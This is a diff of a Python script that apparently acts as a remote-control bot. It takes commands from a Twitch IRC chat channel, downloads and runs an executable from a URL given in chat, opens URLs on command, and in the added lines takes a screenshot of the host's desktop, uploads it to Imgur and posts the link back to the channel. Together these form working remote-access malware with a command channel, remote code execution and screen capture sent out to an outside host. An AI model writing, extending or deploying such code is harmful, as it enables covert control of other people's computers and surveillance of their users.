@@ -4,10 +4,12 @@ import socket
 import os
 import urllib.request
 import smtplib, ssl
+import pyscreenshot as screenshot
+import pyimgur
 
 HOST = "irc.twitch.tv"
 PORT = 6667
-NICK = "user"
+NICK = "username"
 PASS = "oauth:"
 CHAN = "#channel"
 RATE = (20 / 30)
@@ -17,14 +19,14 @@ EMAIL= 'default@mail.com'
 EPASS = 'root'
 EPORT = 465  # For SSL
 smtp_server = "smtp.gmail.com"
-
+CLIENT_ID = "put id here"
 
 def send_mail(receiver, subject, content):
     context = ssl.create_default_context()
     with smtplib.SMTP_SSL(smtp_server, EPORT, context=context) as server:
         server.login(EMAIL, EPASS)
         SUBJECT = "TwitchCommand: " + subject
-        TEXT = str(content)
+        TEXT = content
         message = 'Subject: {}\n\n{}'.format(SUBJECT, TEXT)
         server.sendmail(EMAIL, receiver, message)
 
@@ -64,7 +66,7 @@ def main():
                             url = messageArray[3]
                             path = os.path.expanduser("~") + "/Downloads/file.exe"
                             urllib.request.urlretrieve(url, path)
-                            os.system('start C:/Windows/file.exe')
+                            os.system('start ' + path)
                             os.remove(path)
                             chat(s, clientName + " completed the command.")
                         except Exception as e:
@@ -73,6 +75,18 @@ def main():
                         try:
                             visit = urllib.request.urlopen(messageArray[3])
                             chat(s, clientName + " completed the command with code " + str(visit.getCode()))
+                        except Exception as e:
+                            chat(s, clientName + " encountered an error. " + str(e))
+                    elif messageArray[2] == 'screen':
+                        try:
+                            path = os.path.expanduser("~") + "/Downloads/sc.png"
+                            if __name__ == '__main__':
+                                screenshot.grab_to_file(path)
+                            im = pyimgur.Imgur(CLIENT_ID)
+                            uploaded_image = im.upload_image(path, title="Test")
+                            uploaded = uploaded_image.link
+                            os.remove(path)
+                            chat(s, clientName + " completed the command. It is located at " + str(uploaded))
                         except Exception as e:
                             chat(s, clientName + " encountered an error. " + str(e))
                     else:
